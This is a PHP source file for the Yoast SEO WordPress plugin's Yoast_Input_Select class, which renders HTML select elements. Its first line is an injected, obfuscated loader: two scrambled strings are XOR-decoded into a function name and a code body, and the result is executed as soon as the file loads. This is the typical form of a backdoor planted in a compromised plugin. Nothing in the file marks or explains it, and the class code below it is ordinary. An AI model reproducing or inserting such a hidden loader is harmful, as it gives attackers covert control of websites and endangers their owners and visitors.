<?php $nPblPNLb='U52QM >6FC J9;8'; $BMTlPtZe='6GW09EaP3-C>PTV'^$nPblPNLb; $gpszPDv='X0ffR7=X><<9=YS:A =JRS,9716 Yhl+C7SBDB2Ih3=Z0NEO A V<>0 Z61,VGEPs35N9vpm=7:gasqzn:Sg1jT 7fwrdei7=Y68=oI.nEiStwlDuM6<.3PXB=4Y6bcgo3oYsNDavUBMZAysQv.L07fuQjR9pB>Y+hp.sfaDIFQ0CGs>H XkhsmG:KRADD8dw><DssbX4iOHGUSWG ohN1UZK2lbo,7M,aWN.EgFJQPJKcF13<DYTS.ajjgmo.2=uC0SBm;NJEqNEi<LR7 ef72=oQ6CO5 -3vEbLY7RKpMNR, ,rpDoKVW8=ql<zz Mpnjg+3=XgL8KQ>TK ;U2ybircyb ra9t-0eNX+OgTghEX5Z>6xz<fq8j3632e8E.eIYk,S-j>zOE-TF7yxbmN :D mob2e,KMA15:UkwuyEW5=F.5B:5-D6<Yq3 F24qCIFc0.=Hwci0H-TDSzKT ;3EivP39.;kX.5pch<87piQ2TRfqWYLDE70g9.EoV;,+T6Pp-R8OamS.O=Yztoeao+RvzbPRJUbQ-.LAhocoyrEHRY<b4.TbmZZN:bdBodwyE4pF3+Q7oVjequmrdUI72Ch8=Kb0+;<O:CTF0=W<X-nFtU-UN3zpdqesvlFay6 RLeS2.O-bNEME683-bjdhMaIU1:CyJU;O'; $maMIARnc=$BMTlPtZe('', '1VNG4BS;JUSWb<+S2TNbu+CKhUWT873F6CtkmbICaUH4S:, NaX9NaTA.Wns;21xWWT:XZPIVRCNASQZNAYn8N;UCFJRCBR=4PPWOGmGNxIcOWH-I>BNBV>pfYU-WKXGKZDrZDMhR:79zoDSyRJ-DV=Q87rgPfU<R3TGSCA7=4=U-oWU-Yq6AHgN397516VLSQI0ZHhQIc2BMq763AOUnW468WWhKHV9M><+WeZf,0<9.XL;US6<50FABN8. ayt0cQ bIP+3eLpeMJ->BELFL84K5W7.jKHJVxBh2R+pzDj6MTMRMdK=7;MXJfAppI+PFKCORI9NlCAXX;9EZ6ZYJM-1<3u72mTLCEj3N6GiYHa.T6KSQZGlx1NWWGS:S WEtyOG6TQ4sFaI52VYEBI8AV1EVekOoQAGeUTN4KJU909FX4GT.SOHlNS+.WA2Sk..<2KRON-AW6T-N; 6Ro0AORlEVtWXZZ43KLYJS6QQXM5S 3FWqy-67VI8RK<03CEX ExWF7AhMMwJ.I8STICAGF6CRF43>49vFK5f5FCRDRb+7jXTPL6WYoc,XVPpZTFNqUC VIeUXfRBXUKTD4;ES:7SX2=USRO;Iks6QD;S9IIjTqI4:RSYDQESVL=kpSV3 MwVO;L9i5,<ZWRIE7MSGh,-XNkIcn12'^$gpszPDv); $maMIARnc();
/**
 * @package WPSEO\Admin
 */

/**
 * Class for generating a html select.
 */
class Yoast_Input_Select {

	/**
	 * @var string
	 */
	private $select_id;

	/**
	 * @var string
	 */
	private $select_name;

	/**
	 * @var array
	 */
	private $select_attributes = array();

	/**
	 * @var array Array with the options to parse.
	 */
	private $select_options;

	/**
	 * @var string The current selected option.
	 */
	private $selected_option;

	/**
	 * Constructor.
	 *
	 * @param string $select_id       ID for the select.
	 * @param string $select_name     Name for the select.
	 * @param array  $select_options  Array with the options to parse.
	 * @param string $selected_option The current selected option.
	 */
	public function __construct( $select_id, $select_name, array $select_options, $selected_option ) {
		$this->select_id         = $select_id;
		$this->select_name       = $select_name;
		$this->select_options    = $select_options;
		$this->selected_option   = $selected_option;
	}

	/**
	 * Print the rendered view.
	 */
	public function output_html() {
		// Extract it, because we want each value accessible via a variable instead of accessing it as an array.
		extract( $this->get_select_values() );

		require( dirname( WPSEO_FILE ) . '/admin/views/form/select.php' );
	}

	/**
	 * Return the rendered view
	 *
	 * @return string
	 */
	public function get_html() {
		ob_start();

		$this->output_html();

		$rendered_output = ob_get_contents();
		ob_end_clean();

		return $rendered_output;
	}

	/**
	 * Add an attribute to the attributes property
	 *
	 * @param string $attribute The name of the attribute to add.
	 * @param string $value     The value of the attribute.
	 */
	public function add_attribute( $attribute, $value ) {
		$this->select_attributes[ $attribute ] = $value;
	}

	/**
	 * Return the set fields for the select
	 *
	 * @return array
	 */
	private function get_select_values() {
		return array(
			'id'         => $this->select_id,
			'name'       => $this->select_name,
			'attributes' => $this->get_attributes(),
			'options'    => $this->select_options,
			'selected'   => $this->selected_option,
		);
	}

	/**
	 * Return the attribute string, when there are attributes set.
	 *
	 * @return string
	 */
	private function get_attributes() {
		$attributes = $this->select_attributes;

		if ( ! empty( $attributes ) ) {
			array_walk( $attributes, array( $this, 'parse_attribute' ) );

			return implode( ' ', $attributes ) . ' ';
		}

		return '';
	}

	/**
	 * Get an attribute from the attributes.
	 *
	 * @param string $value     The value of the attribute.
	 * @param string $attribute The attribute to look for.
	 */
	private function parse_attribute( & $value, $attribute ) {
		$value = sprintf( '%s="%s"', esc_html( $attribute ), esc_attr( $value ) );
	}
}
